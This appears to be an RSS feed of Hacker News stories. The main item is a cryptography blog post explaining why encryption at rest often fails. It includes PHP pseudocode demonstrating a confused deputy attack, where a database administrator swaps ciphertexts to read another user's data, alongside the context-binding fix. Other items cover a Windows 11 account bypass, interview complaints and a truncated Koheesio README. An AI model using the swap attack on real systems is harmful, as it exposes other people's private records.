<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Tue, 04 Jun 2024 15:30:05 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[Encryption at Rest: Whose Threat Model Is It Anyway? (123 pts)]]></title>
            <link>https://scottarc.blog/2024/06/02/encryption-at-rest-whose-threat-model-is-it-anyway/</link>
            <guid>40573211</guid>
            <pubDate>Tue, 04 Jun 2024 11:25:18 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://scottarc.blog/2024/06/02/encryption-at-rest-whose-threat-model-is-it-anyway/">https://scottarc.blog/2024/06/02/encryption-at-rest-whose-threat-model-is-it-anyway/</a>, See on <a href="https://news.ycombinator.com/item?id=40573211">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
<p><strong>Head’s up</strong>: This is a blog post about applied cryptography, with a focus on web and cloud applications that encrypt data at rest in a database or filesystem. While the lessons can be broadly applicable, the scope of the post is not.</p>



<hr>



<p>One of the lessons I learned during my time at AWS Cryptography (and particularly as an AWS Crypto Bar Raiser) is that the threat model for Encryption At Rest is often undefined.</p>



<p>Prior to consulting cryptography experts, most software developers do not have a clear and concise understanding of the risks they’re facing, let alone how or why the encrypting data at rest would help protect their customers.</p>



<p>Unsurprisingly, I’ve heard a few infosec thought leader types insist that encryption-at-rest is security theater over the years. I disagree with this assessment in the absolute terms, but there is a nugget of truth in that assertion.</p>



<figure><img loading="lazy" data-attachment-id="581" data-permalink="https://scottarc.blog/2024/06/02/encryption-at-rest-whose-threat-model-is-it-anyway/whose-threat-model/" data-orig-file="https://scottarc.blog/wp-content/uploads/2024/06/whose-threat-model.jpg" data-orig-size="566,440" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="whose-threat-model" data-image-description="" data-image-caption="" data-medium-file="https://scottarc.blog/wp-content/uploads/2024/06/whose-threat-model.jpg?w=300" data-large-file="https://scottarc.blog/wp-content/uploads/2024/06/whose-threat-model.jpg?w=566" width="566" height="440" src="https://scottarc.blog/wp-content/uploads/2024/06/whose-threat-model.jpg?w=566" alt="Whose threat model is it anyway?"><figcaption>The million dollar question.</figcaption></figure>



<p>Let’s explore this subject in a little more detail.</p>



<h2>Why should we listen to <em>you</em> about this topic?</h2>



<p>(If you don’t need any convincing, feel free to <a href="#protection">skip this section</a>.)</p>



<p>Encryption at rest is a particular hobby horse of mine. I previously wrote on this blog about <a href="https://scottarc.blog/2023/08/18/innovations-in-the-aws-database-encryption-sdk/">the under-celebrated design decisions in the AWS Database Encryption SDK</a> and <a href="https://scottarc.blog/2022/10/17/lucid-multi-key-deputies-require-commitment/">the need for key-committing AEAD modes in multi-tenant data lakes</a>.</p>



<p>Before my time at Amazon, I had also designed a PHP library called <a href="https://ciphersweet.paragonie.com/">CipherSweet</a> that offers a limited type of Searchable Encryption. The goal of CipherSweet was to improve the cryptography used by SuiteCRM. (The library name is, of course, a pun.)</p>



<p>I’ve also contributed a ton of time making cryptography easy-to-use and hard to misuse outside of the narrow use-case that is at-rest data encryption. To that end, I designed <a href="https://paseto.io/">PASETO</a> as a secure-by-default alternative to JSON Web Tokens.</p>



<p>I also have a lot of skin in the game when it comes to developer comprehension: I was the first Stack Overflow user with a gold badge for both <a href="https://stackoverflow.com/help/badges/1030/security" target="_blank" rel="noreferrer noopener">[security]</a> and <a href="https://stackoverflow.com/help/badges/4641/encryption" target="_blank" rel="noreferrer noopener">[encryption]</a>, largely due to the effort I put into cleaning up the <a href="https://meta.stackoverflow.com/questions/293930/problematic-php-cryptography-advice-in-popular-questions" target="_blank" rel="noreferrer noopener">bad cryptography advice for the PHP ecosystem</a>.</p>



<p>I have spent the past decade or so trying to help teams avoid <a href="https://paragonie.com/blog/2019/05/wordpress-5-2-mitigating-supply-chain-attacks-against-33-internet" target="_blank" rel="noreferrer noopener">security disasters in one form or another</a>. </p>



<h3>Why should we <strong>not</strong> listen to you about this topic?</h3>



<p>If you happen to know a cryptography expert you trust more than some Internet stranger with a blog, I implore you to listen to them if we disagree on any point. They may know something I don’t. (That said, I’m always happy to learn something new!)</p>



<p>I also do <strong>not</strong> have a college degree in Cryptography, nor have I published any papers in prestigious academic journals. If you care very much about this sort of pedigree, you will likely find my words easily discarded. If this describes your situation, no hard feelings.</p>



<h2 id="protection">Why and How to use Encryption At Rest to Protect Sensitive Data</h2>



<blockquote>
<p><strong>Important:</strong> I’m chiefly interested in discussing one use-case, and not focusing on other use cases. Namely, I’m focusing on encryption-at-rest in the narrow context of web applications and/or cloud services.</p>



<p>This is not a comprehensive blog post covering every possible use case or threat model relating to encryption at rest. Those other use cases are certainly interesting, but this post is already long enough with a narrower focus.</p>



<p>In particular: I’m not talking about the threats faced by activists or whistleblowers. This is a software engineering and applied cryptography focused blog post.</p>
</blockquote>



<p>If you’re only interested in compliance requirements, you can probably just enable Full Disk Encryption and call it a day. Then, if your server’s hard drive grows legs and walks out of the data center, your users’ most sensitive data will remain confidential.</p>



<p>Unfortunately, for the server-side encryption at rest use case, that’s basically all that Disk Encryption protects against.</p>



<p>If your application or database software is online and an attacker gains access to it (e.g., through SQL injection), with full disk encryption, <em>it might as well be plaintext</em> to an online attacker.</p>



<figure><img loading="lazy" data-attachment-id="607" data-permalink="https://scottarc.blog/2024/06/02/encryption-at-rest-whose-threat-model-is-it-anyway/full-disk-encryption/" data-orig-file="https://scottarc.blog/wp-content/uploads/2024/06/full-disk-encryption.jpg" data-orig-size="500,559" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="full-disk-encryption" data-image-description="" data-image-caption="" data-medium-file="https://scottarc.blog/wp-content/uploads/2024/06/full-disk-encryption.jpg?w=268" data-large-file="https://scottarc.blog/wp-content/uploads/2024/06/full-disk-encryption.jpg?w=500" width="500" height="559" src="https://scottarc.blog/wp-content/uploads/2024/06/full-disk-encryption.jpg?w=500" alt="Corporate needs you to find the differences between this picture and this picture. Picture 1: Full Disk Encryption. Picture 2: Plaintext Data. Attackers: They're the same picture."><figcaption>It do be like that.</figcaption></figure>



<p>Therefore, if you find yourself reaching for Encryption At Rest to mitigate the impact of the kind of vulnerability that would leak the contents of your database or filesystem to an attacker, you’re probably unwittingly engaging in security theater.</p>



<p>Disk Encryption is important for disk disposal and mitigating hardware theft, not preventing data leakage to online attackers.</p>



<p>So the next logical thing to do is draw a box around the system or component that stores a lot of data and never let plaintext cross that boundary.</p>



<h3>Client-Side Encryption</h3>



<p>Note: The naming here is a little imprecise. It <em>is</em> client-side encryption with respect to your data warehouse (i.e. SQL database), but not with respect to the user experience of a web application. In those cases, client-side would mean on the actual end user’s device.</p>



<p>Instead, client-side encryption is the generic buzz-word to mean that you’re encrypting data outside of the box you drew in your system architecture. Generally, this means that you have an application server that’s acting as the “client” for the purpose of bulk data encryption.</p>



<p>There are a lot of software projects that aim to provide client-side encryption for data stored in a database or filesystems; e.g., in Amazon S3 buckets.</p>



<p>This is a step in the right direction, but implementation details matter a lot.</p>



<blockquote>
<p><em>Quick aside:</em> For the remainder of this blog post, I’m going to assume an architecture that looks like a traditional web application, for simplicity.</p>



<p>The assumed architecture looks vaguely like this:</p>



<ul>
<li>User Agents (e.g., web browsers) that communicate with the application server.</li>



<li>Application Server(s) respond to HTTP requests from user agents, manages key material using KMS, encrypts / decrypts records stored in the database.</li>



<li>Database Server(s) which store ciphertext on behalf of the application server.</li>
</ul>



<p>This is an abstract design, so the actual implementation details you encounter in the real world may be simpler or more complex in different respects.</p>



<p>There are other interesting design considerations for OS-level end-user device encryption that I’m not going to explore today. For example: <a href="https://tosc.iacr.org/index.php/ToSC/article/view/7360">Adiantum</a> is extremely cool.</p>



<p>I’m also not going to dive deep into laptop theft or the importance of Full Disk Encryption as a mechanism for ensuring data is erased from solid state hard drives, or the activities of hostile nation states. That’s a separate discussion entirely.</p>
</blockquote>



<h2 id="security-considerations">Security Considerations for Client-Side Encryption</h2>



<p>The first question to answer when data is being encrypted is, “How are the keys being managed?” This is a very deep rabbit hole of complexity, but one good answer for a centralized service is, “Cloud-based key management service with audit logging”; i.e. AWS KMS, Google CloudKMS, etc.</p>



<p>We could talk about key management for a very long time, but there’s other things I want to focus on, so let’s revisit that in a future blog post.</p>



<p>Next, you have to understand how the data is being encrypted in the first place.</p>



<p><strong>Bad answer:</strong> <a href="https://robertheaton.com/2013/07/29/padding-oracle-attack/" target="_blank" rel="noreferrer noopener">AES in CBC mode without HMAC</a>.</p>



<p><strong>Worse answer:</strong> <a href="https://words.filippo.io/the-ecb-penguin/" target="_blank" rel="noreferrer noopener">AES in ECB mode</a>.</p>



<p>Generally, you’re going to want to use an AEAD construction, such as AES-GCM or XChaCha20-Poly1305.</p>



<p>You’ll also want <a href="https://scottarc.blog/2022/10/17/lucid-multi-key-deputies-require-commitment/">key-commitment</a> if you’re storing data for multiple customers in the same hardware. You can get this property by stapling HKDF onto your protocol (once for key derivation, again for commitment). See also: <a href="https://github.com/paseto-standard/paseto-spec/blob/master/docs/Rationale-V3-V4.md#better-use-of-hkdf-salts-change">PASETO v3 and v4</a>, or <a href="https://aws.amazon.com/blogs/security/improved-client-side-encryption-explicit-keyids-and-key-commitment/" target="_blank" rel="noreferrer noopener">Version 2 of the AWS Encryption SDK</a>.</p>



<p>It may be tempting to build a committing AEAD scheme out of, e.g., AES-CTR and HMAC, but take care that you don’t introduce canonicalization risks in your MAC.</p>



<h3>Is Your Deputy Confused?</h3>



<p>Even if you’re using IND-CCA secure encryption and managing your keys securely, there is still a very stupid attack against many data-at-rest encryption schemes.</p>



<p>To understand the attack, first consider this sort of scenario:</p>



<blockquote>
<p>Alice and Bob use the same health insurance provider, whom is storing sensitive medical records for both parties. Bob works as a database administrator for the insurance company he and Alice both use. One day, he decides to snoop on her private medical history.</p>



<p>Fortunately, the data is encrypted at the web application, so all of the data Bob can access is indistinguishable from random. He can access his own account and see his data through the application, but he cannot see Alice’s data from his vantage point on the database server.</p>
</blockquote>



<p>Here’s the stupid simple attack that works in far too many cases: Bob copies Alice’s encrypted data, and overwrites his records in the database, then accesses the insurance provider’s web app. </p>



<p><strong>Bam!</strong> Alice’s plaintext recovered.</p>



<p>What’s happening here is simple: The web application has the ability to decrypt different records encrypted with different keys. If you pass records that were encrypted for Alice to the application to decrypt it for Bob, and you’re <em>not authenticating your access patterns</em>, Bob can read Alice’s data by performing this attack.</p>



<p>The cryptographic attack is literally copy and paste, from the database administrator’s perspective. It’s stupid but <em>it works against too many encryption-at-rest software projects</em>.</p>



<p>In this setup, the application is the Deputy, and you can easily confuse it by replaying an encrypted blob in the incorrect context.</p>



<p>The mitigation is simple: Use the AAD mechanism (part of the standard AEAD interface) to bind a ciphertext to its context. This can be a customer ID, each row’s value for the primary key of the database table, or something else entirely.</p>



<p>If you’re using AWS KMS, you can also use <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/confused-deputy.html" target="_blank" rel="noreferrer noopener">Encryption Context for this exact purpose</a>.</p>



<h3>An Illustrative Example</h3>



<p>Let’s say you have a simple web application that encrypts data before storing it in a SQL database. </p>



<p>Let’s also write it to use AES-GCM, since unauthenticated CBC mode is awful.</p>



<p>A quick and dirty implementation might look like this:</p>


<div><pre title="">class User {
    public function __construct(
        public readonly string $username,
        public string $email,
        public string $fullName
    ) {}
}

class UserModel {
    public function __construct(protected Database $db)
    {}

    public function save(User $user): bool
    {
        return $this-&gt;db-&gt;upsert(
           'users', 
           [ // set
               'full_name' =&gt; aes128gcm_encrypt($user-&gt;fullName),
               'email' =&gt; aes128gcm_encrypt($user-&gt;email)
                       // encryption details abstracted
           ], 
           [ // where
               'username' =&gt; $user-&gt;username
           ]
        );
    }

    public function fetch(string $username): User
    {
        $row = $this-&gt;db-&gt;fetch('users', ['username' =&gt; $username]);
        return new User(
            $username,
            aes128gcm_decrypt($row['email']),
            aes128gcm_decrypt($row['full_name'])
        );
    }
}
</pre></div>


<p>For the abstracted <code>aes128gcm</code> functions in the pseudocode above, just assume they’re getting the key from KMS during encryption and storing an encrypted data key in a place the ciphertext can reference later on decrypt. I didn’t want to complicate the pseudocode with a lot of boilerplate.</p>



<p>You might decide to prove the confused deputy risk by doing something like this:</p>


<div><pre title="">$model = new UserModel($db);
$model-&gt;save(new User('alice', 'alice@example.com', 'Alice McWonderland'));
$model-&gt;save(new User('bob', 'bob@example.com', 'Bob BurgerMeister'));

// Fetch Alice's data
$aliceData = $db-&gt;fetch('users', ['username' =&gt; 'alice']);
$bobData = $db-&gt;fetch('users', ['username' =&gt; 'bob']);

// This is the attack the database server can perfrom:
// Replace Bob's full_name with Alice's email
$db-&gt;upsert('users', [
    'full_name' =&gt; $alice['email']
], ['username' =&gt; 'bob']);

$badBob = $model-&gt;fetch('bob');
</pre></div>


<p>Now Bob’s full name is set to Alice’s email address.</p>



<h3>The Curious Case of CipherSweet</h3>



<p>My knowledge of this risk didn’t manifest itself in a vacuum. It was discovered over the years of maintaining an open source library.</p>



<p>The first release of CipherSweet mitigated most of this risk by construction: Each field uses a different encryption key, through a key derivation scheme. </p>



<p>In <a href="https://scottarc.blog/wp-content/uploads/2024/06/pseudocode-py.jpg" target="_blank" rel="noreferrer noopener">pseudocode</a>:</p>


<div><pre title="">def encryptRow(self, records):
    for field, type in self.fieldsToEncrypt:
       key = self.getFieldSymmetricKey(self.table, field)
       records[field] = encryptField(key, field)
</pre></div>


<p>Since CipherSweet’s inception, if you try to replace Alice’s encrypted zip code with Alice’s encrypted social security number, the keys would be wrong, so it would lead to a decryption failure.</p>



<p><strong>Or so I thought!</strong></p>



<p>As I mentioned in my blog post about <a href="https://scottarc.blog/2022/10/17/lucid-multi-key-deputies-require-commitment/">multi-tenancy and confused deputy attacks</a>, if your AEAD mode doesn’t commit to the key used, it’s possible to craft a single (ciphertext, tag) that decrypts to two different plaintext values under two different keys.</p>



<p>CipherSweet’s <code>ModernCrypto</code> suite used XChaCha20-Poly1305, which is not key-committing, and therefore susceptible to this sort of misuse.</p>



<p>This violated the Principle of Least Astonishment and motivated the development of a new algorithm suite called <code>BoringCrypto</code>, which used BLAKE2b-MAC instead of Poly1305. This change was released <a href="https://github.com/paragonie/ciphersweet/releases/tag/v3.0.0">in version 3.0.0 in June 2021</a>. </p>



<p>However, even with <code>BoringCrypto</code> in 3.0.0, this only mitigated <em>most of </em> the issue by construction. The last mile of complexity here is that each field must also be bound to a primary key or foreign key.</p>



<p>Encrypting with AAD has been possible since a very early release of CipherSweet, but being possible to use securely is not sufficient. It should be <em>easy</em> to use securely.</p>



<p><a href="https://github.com/paragonie/ciphersweet/releases/tag/v4.7.0">CipherSweet Version 4.7.0</a>, which was released last month, now only requires a code change that looks like this in order to mitigate confused deputies in an application:</p>


<div><pre title="">  $multiRowEncryptor = new EncryptedMultiRows($engine);
  $multiRowEncryptor
+     -&gt;setAutoBindContext(true)
+     -&gt;setPrimaryKeyColumn('table2', 'id')
      -&gt;addTextField('table1', 'field1')
</pre></div>


<p>This is in addition to the new <a href="https://ciphersweet.paragonie.com/php/usage#enhanced-aad">Enhanced AAD</a> feature, which allows for flexible and powerful context binding based on other fields and/or string literals.</p>



<p>(In fact, this new convenience feature actually uses Enhanced AAD under-the-hood.)</p>



<p>This doesn’t come for free, however: Users have to know the serial / primary key for a record prior to writing it, in order to use it as AAD when encrypting fields. However, that’s a much easier pill to swallow than expecting PHP devs to manage the complexity of context-binding themselves.</p>



<p>As you can see, mitigating confused deputies in an encryption library (without making it unwieldy) requires a painstaking attention to detail to get right.</p>



<p>As Avi Douglen says, “Security at the cost of usability comes at the cost of security.”</p>



<p>Given the prevalence of client-side encryption projects that just phone it in with insecure block cipher modes (or <a href="https://fosstodon.org/@atoponce/112550648928122217">ECB, which is the absence of a block cipher mode entirely</a>), it’s highly doubtful that most of them will ever address confused deputy attacks. Even I didn’t get it right at first when I made CipherSweet back in 2018.</p>



<h3>What about non-databases?</h3>



<p>Everything I mentioned in the previous section was focused on confused deputy attacks against client-side encryption for information that is stored in a database, but it’s a general problem with encrypting data at rest and storing the ciphertext “server-side”.</p>



<p>If you’re storing encrypted data in an S3 bucket, rather than in MySQL, you still need some form of context-binding mechanism to prevent the dumb and obvious attack from working against a deputy that reads data from said S3 bucket.</p>



<p>If you take nothing else away from this blog post, remember: <em>Authenticate your access patterns</em>.</p>



<h2>Why aren’t things better already?</h2>



<p>As with most things in software security, the problem is either not widely known, or is not widely understood.</p>



<p>Unknown unknowns tend to fester, untreated, across the entire ecosystem.</p>



<p>Misunderstood issues often lead to an incorrect solution.</p>



<p>In this case, at-rest encryption is mostly in Column B, and confused deputy attacks are mostly in Column A.</p>



<p>The most pronounced consequence of this is, when tasked with building at-rest data encryption in an application, most software developers do not have a cohesive threat model in mind (let alone a formal one).</p>



<p>This leads to disagreement between stakeholders about what the security requirements actually are.</p>



<h3>How can I help improve things somewhat?</h3>



<p>Most importantly, spread awareness of the nuances of encryption at-rest.</p>



<p>This blog post is intended to be a good conversation starter, but there are other resources to consider, too. I’ve linked to many of them throughout this post already.</p>



<p>If you’re paying for software to encrypt data at rest, ask your vendor how they mitigate the risk of confused deputy attacks. Link them to this blog post if they’re not sure what you mean.</p>



<p>If said vendor responds, “this risk is outside of our threat model,” ask to see their formal threat model document. If it exists and doesn’t align with your application’s threat model, maybe consider alternative solutions that provide protection against more attack classes than Full Disk Encryption would.</p>



<p>Finally, gaining experience with <a href="https://www.trailofbits.com/services/software-assurance/appsec/" target="_blank" rel="noreferrer noopener">threat modeling</a> is a good use of every developer’s time. Adam Caudill has <a href="https://adamcaudill.com/2016/07/20/threat-modeling-for-applications/">an excellent introductory blog post on the subject</a>.</p>



<h2>Closing Thoughts</h2>



<p>Despite everything I’ve written here today, I do not claim to have all the answers for encryption at rest.</p>



<p>However, you can unlock a lot of value just by asking the right questions. My hope is that anyone that reads this post is now capable of asking those questions.</p>



<h3 id="addendum-2024-06-03">Addendum (2024-06-03)</h3>



<p>After I published this, the r/netsec subreddit has expressed disappointment that this blog post had “no mention of” consumer device theft or countries experiencing civil unrest and pulling hard drives from data centers.</p>



<p>You could make a congruent  complaint that it also had no mention of Batman.</p>



<p>To be clear, I’m <strong>not</strong> saying that the use cases and risks Reddit cares about are off-topic to any discussion of full-disk encryption. They matter.</p>



<p>Rather, it’s that they’re not relevant to <em>the specific point I am making</em>: Even in the simplest use case, far from the annoying details of end user hardware or the whims of nation states, encryption-at-rest is poorly understood by most developers, and should be thought through carefully.</p>



<p>Your threat model is not my threat model, and vice versa.</p>



<p>I never advertised this blog post as a comprehensive and complete guide to the entire subject of encryption-at-rest. If you too felt under-served by this blog post for not addressing the corner cases that really matter to <em>you</em>, I hope this addendum makes it clearer why I didn’t cover them.</p>



<p>Finally, if you feel that there’s an aspect of the encryption-at-rest topic that really warrants further examination, I invite you to blog about it. </p>



<p>If your blog post is interesting enough, I’ll revise this post and link to it here.</p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Microsoft blocks Windows 11 workaround that enabled local accounts (141 pts)]]></title>
            <link>https://www.pcworld.com/article/2354686/microsoft-blocks-windows-11-workaround-local-accounts.html</link>
            <guid>40572289</guid>
            <pubDate>Tue, 04 Jun 2024 09:10:10 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.pcworld.com/article/2354686/microsoft-blocks-windows-11-workaround-local-accounts.html">https://www.pcworld.com/article/2354686/microsoft-blocks-windows-11-workaround-local-accounts.html</a>, See on <a href="https://news.ycombinator.com/item?id=40572289">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="link_wrapped_content">




<p>Before PC users can enjoy everything Windows 11 has on tap, they must first enter an e-mail address that’s linked to a Microsoft account. If you don’t have one, you’ll be asked to create one before you can start setting it up.</p>



<p>A frequently used trick to circumvent this block is a small but ingenious step. By entering a random e-mail address and password, which doesn’t exist and causes the link to fail, you end up directly with the creation of a local account and can thus avoid creating an official account with Microsoft.</p>



		

		


<p>Many users prefer this method, as a local account promises more control over their own data and more privacy. However, without a Microsoft account, some useful functions are also lost such as account backup or special features for apps like Copilot.</p>



<p>This common method no longer seems to work, as Microsoft has apparently patched this bug. Instead of skipping the account link, you’re led into a kind of continuous loop that doesn’t end until you have entered the correct email address.</p>

		
			
			


<figure><div>
<blockquote data-width="500" data-dnt="true"><p lang="en" dir="ltr">It looks like Microsoft has blocked the bypass that allowed you to create a local account during Windows 11 setup by typing in a blocked email address. Now it just loops you back to typing in a different account ðŸ™ <a href="https://go.redirectingat.com/?id=111346X1569483&amp;url=https://t.co/mKnHToLLQV&amp;xcust=2-1-2354686-1-0-0&amp;sref=https://www.pcworld.com/article/2354686/microsoft-blocks-windows-11-workaround-local-accounts.html" rel="nofollow">pic.twitter.com/mKnHToLLQV</a></p>— Zac Bowden (@zacbowden) <a href="https://go.redirectingat.com/?id=111346X1569483&amp;url=https://twitter.com/zacbowden/status/1797496910737252744?ref_src=twsrc%5Etfw&amp;xcust=2-1-2354686-1-0-0&amp;sref=https://www.pcworld.com/article/2354686/microsoft-blocks-windows-11-workaround-local-accounts.html" rel="nofollow">June 3, 2024</a></blockquote>
</div></figure>



<p>Previously, it was possible to cut the Internet connection in the Task Manager before creating an account. Microsoft has since removed this workaround. As a result, many people who previously used this method are now forced to enter a working Microsoft account email address and password or use other methods.</p>



<h2 id="bypassing-microsoft-account-restrictions">Bypassing Microsoft account restrictions</h2>



<p>Another method of bypassing the account lockdown still exists. You simply have to enter OOBE\BYPASSNRO in the command prompt during the Windows 11 setup process, which allows you to skip the connection to the Internet and thus also the link to a Microsoft account. </p>



<p>However, it’s questionable how long this option will remain available. It seems that Microsoft is aiming to make the use of Windows 11 dependent on a Microsoft account. In combination with the increased calls for Windows users to finally switch to Windows 11, this appears to be a controversial combination.</p>



<p><em>This article originally appeared on PC Welt and has been translated from German to English.</em></p>

</div><p>This article originally appeared on our sister publication <a href="https://www.pcwelt.de/" rel="noreferrer noopener" target="_blank">PC-WELT</a> and was translated and localized from German.</p><div data-ga="article-footer-author">
				<p>Laura ist begeisterte Gamerin sowie Film- und Serien-Fan. Nach ihrem Studium der Kommunikationswissenschaft verschlug es sie direkt in die ersten Redaktionen, um ihre Leidenschaft auszuleben. Seitdem schreibt sie über alles rund um PCs und Technik-Themen und ist seit Mai 2024 bei PC Welt als feste Redakteurin tätig.</p>
					<ul>
																															
						  
						    
					</ul>
				
			</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[A breakthrough towards the Riemann hypothesis (181 pts)]]></title>
            <link>https://mathstodon.xyz/@tao/112557248794707738</link>
            <guid>40571995</guid>
            <pubDate>Tue, 04 Jun 2024 08:25:19 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://mathstodon.xyz/@tao/112557248794707738">https://mathstodon.xyz/@tao/112557248794707738</a>, See on <a href="https://news.ycombinator.com/item?id=40571995">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[I Am So Sick of Leetcode-Style Interviews (373 pts)]]></title>
            <link>https://nelson.cloud/i-am-so-sick-of-leetcode-style-interviews/</link>
            <guid>40571395</guid>
            <pubDate>Tue, 04 Jun 2024 06:47:51 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://nelson.cloud/i-am-so-sick-of-leetcode-style-interviews/">https://nelson.cloud/i-am-so-sick-of-leetcode-style-interviews/</a>, See on <a href="https://news.ycombinator.com/item?id=40571395">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><article><div><p>I quit my previous job at <a href="https://robinhood.com/?ref=nelson.cloud" target="_blank">Robinhood</a>
in late November of 2023 mainly for health reasons. I’ve been in various interviews since then. Things have fallen off for one reason or another but I just gotta say…I am getting so tired of <a href="https://leetcode.com/problemset/?ref=nelson.cloud" target="_blank">Leetcode</a>
-style interviews. Especially since I know for a fact they don’t reflect the actual responsibilities of a software engineering of a job.</p><p>It seems like most (if not all) companies do these kinds of interviews simply because that’s what all the big companies do, like Google, Facebook, Amazon, and so on.</p><p>I’ve had some very bright engineers tell me that I shouldn’t memorize things that I can easily google. But yet, these interviews quiz me on things that I can easily Google that I may not know off the top of my head. It’s absurd.</p><p>I don’t really have a solution to this problem, I just know it’s a problem.</p><p>And I’m sick of it.</p><p>If you need a Software Engineer with AWS, Kuberentes, and Ruby on Rails experience, and you don’t do silly quizzes, feel free to reach out!</p></div></article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Koheesio: Nike's Python-based framework to build advanced data-pipelines (141 pts)]]></title>
            <link>https://github.com/Nike-Inc/koheesio</link>
            <guid>40570892</guid>
            <pubDate>Tue, 04 Jun 2024 05:07:57 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/Nike-Inc/koheesio">https://github.com/Nike-Inc/koheesio</a>, See on <a href="https://news.ycombinator.com/item?id=40570892">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto"><h2 tabindex="-1" dir="auto">Koheesio</h2><a id="user-content-koheesio" aria-label="Permalink: Koheesio" href="#koheesio"></a></p>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/Nike-Inc/koheesio/main/docs/assets/logo_koheesio.svg"><img src="https://raw.githubusercontent.com/Nike-Inc/koheesio/main/docs/assets/logo_koheesio.svg" alt="Koheesio logo" width="500"></a>
</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>CI/CD</td>
<td><a href="https://github.com/Nike-Inc/koheesio/actions/workflows/test.yml"><img src="https://github.com/Nike-Inc/koheesio/actions/workflows/test.yml/badge.svg" alt="CI - Test"></a> <a href="https://github.com/Nike-Inc/koheesio/actions/workflows/release.yml"><img src="https://github.com/Nike-Inc/koheesio/actions/workflows/release.yml/badge.svg" alt="CD - Release Koheesio"></a></td>
</tr>
<tr>
<td>Package</td>
<td><a href="https://pypi.org/project/koheesio/" rel="nofollow"><img src="https://camo.githubusercontent.com/fea8b211ac85787d156ca1ec6e2019c06414f0a9391c377f35ffaee98bad9603/68747470733a2f2f696d672e736869656c64732e696f2f707970692f762f6b6f68656573696f2e7376673f6c6f676f3d70797069266c6162656c3d50795049266c6f676f436f6c6f723d676f6c64" alt="PyPI - Version" data-canonical-src="https://img.shields.io/pypi/v/koheesio.svg?logo=pypi&amp;label=PyPI&amp;logoColor=gold"></a> <a href="https://pypi.org/project/koheesio/" rel="nofollow"><img src="https://camo.githubusercontent.com/d54efd240909933c8ec591c4a97a4a84dd3e7d1222c0be553856963ebb67f4e0/68747470733a2f2f696d672e736869656c64732e696f2f707970692f707976657273696f6e732f6b6f68656573696f2e7376673f6c6f676f3d707974686f6e266c6162656c3d507974686f6e266c6f676f436f6c6f723d676f6c64" alt="PyPI - Python Version" data-canonical-src="https://img.shields.io/pypi/pyversions/koheesio.svg?logo=python&amp;label=Python&amp;logoColor=gold"></a> <a href="https://pypi.org/project/koheesio/" rel="nofollow"><img src="https://camo.githubusercontent.com/1b118ecbda4ba4cbac01779e8ce45cf5c06605077cf9bfaeb496e5f6c42f2562/68747470733a2f2f696d672e736869656c64732e696f2f707970692f646d2f6b6f68656573696f3f636f6c6f723d626c7565266c6162656c3d496e7374616c6c73266c6f676f3d70797069266c6f676f436f6c6f723d676f6c64" alt="PyPI - Downloads" data-canonical-src="https://img.shields.io/pypi/dm/koheesio?color=blue&amp;label=Installs&amp;logo=pypi&amp;logoColor=gold"></a></td>
</tr>
<tr>
<td>Meta</td>
